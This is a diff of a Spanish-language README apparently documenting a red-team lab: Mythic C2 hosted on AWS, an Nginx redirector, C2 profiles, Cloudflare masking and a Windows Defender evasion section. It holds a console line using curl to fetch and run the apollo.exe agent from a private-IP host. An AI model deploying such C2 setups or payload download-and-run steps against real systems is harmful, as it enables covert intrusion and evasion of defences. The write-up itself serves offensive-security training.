@@ -19,7 +19,7 @@ La infraestructura se desplegó en Amazon Web Services (AWS) para emular un esce
 
 •Alojamiento de la plataforma Mythic C2, un framework modular y extensible para la gestión de agentes, creación de payloads y perfiles de comunicación.
 •Centraliza el control sobre los sistemas comprometidos y coordina las acciones ofensivas.
-<img width="920" height="402" alt="image" src="https://github.com/user-attachments/assets/a9bc9594-f22b-43b5-94d9-b81b8eb11efb" />
+
 
 
 
@@ -65,7 +65,10 @@ sudo ./install_docker_containers.sh
 
 
 
-Una vez completada la instalación, se accede a la interfaz web de Mythic a través de la IP privada del servidor C2 (o un túnel SSH si se accede desde fuera de la VPC ) para configurar los C2 Profiles y generar los payloads.
+Una vez completada la instalación, se accede a la interfaz web de Mythic a través de la IP pública del servidor C2 (o un túnel SSH si se accede desde fuera de la VPC ) para configurar los C2 Profiles y generar los payloads.
+
+<img width="1028" height="536" alt="image" src="https://github.com/user-attachments/assets/d04188c5-6678-4fb5-a51e-302b07c318a7" />
+
 
 2. Configuración del Servidor Redirector con Nginx (Ubuntu en AWS)
 
@@ -108,6 +111,7 @@ server {
         proxy_read_timeout 86400s; # Aumentar el timeout para conexiones persistentes
     }
 
+<img width="920" height="485" alt="image" src="https://github.com/user-attachments/assets/efd89241-3ee9-4e9c-a8fc-e22fda8f92d2" />
 
 
 
@@ -135,6 +139,11 @@ Dentro de Mythic, la creación de C2 Profiles es clave para definir cómo se com
 
 •Encryption: Uso de SSL/TLS para cifrar las comunicaciones.
 
+<img width="1009" height="547" alt="image" src="https://github.com/user-attachments/assets/046fff57-f9f2-40b4-a61e-5415e9becfea" />
+
+<img width="1029" height="539" alt="image" src="https://github.com/user-attachments/assets/6ef77132-c692-406a-abbd-98889e580e20" />
+
+
 4. Configuración DNS y Cloudflare (Opcional pero recomendado para Operaciones Reales )
 
 Para una mayor ofuscación y gestión de certificados SSL, se puede integrar un servicio como Cloudflare. Esto permite:
@@ -142,6 +151,9 @@ Para una mayor ofuscación y gestión de certificados SSL, se puede integrar un 
 •Ocultar la IP pública del redirector: Utilizando el modo proxy de Cloudflare, la IP real del servidor redirector permanece oculta, mostrando solo las IPs de Cloudflare.
 •Gestión de Certificados SSL: Cloudflare puede manejar los certificados SSL/TLS, simplificando la configuración en Nginx.
 •Reglas de Filtrado y Protección DDoS: Añade una capa adicional de seguridad y resiliencia contra ataques.
+
+<img width="1027" height="539" alt="image" src="https://github.com/user-attachments/assets/41c48305-2f93-48cd-9861-24bd693e336f" />
+
 
 Metodología de Evasión de EDR (Windows Defender)
 
@@ -164,6 +176,7 @@ C:\Users\mirei\Downloads>curl http://192.168.17.141:8000/apollo.exe -o apollo.ex
 100 2057k  100 2057k    0     0  7913k      0 --:--:-- --:--:-- --:--:-- 7942k
 C:\Users\mirei\Downloads>apollo.exe
 
+<img width="1026" height="436" alt="image" src="https://github.com/user-attachments/assets/73535554-fdca-43ae-ad8d-7d6d6e72714e" />
 
 
 
